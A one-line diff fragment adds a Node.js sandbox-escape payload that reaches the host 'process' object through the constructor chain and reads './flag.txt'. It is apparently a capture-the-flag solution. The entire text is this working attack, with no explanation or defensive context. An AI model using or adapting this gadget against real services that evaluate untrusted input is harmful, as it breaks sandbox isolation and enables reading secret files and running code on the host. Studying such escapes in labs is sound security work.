@@ -1,0 +1,1 @@
+    this.constructor.constructor("return process")().mainModule.require("fs").readFileSync("./flag.txt")
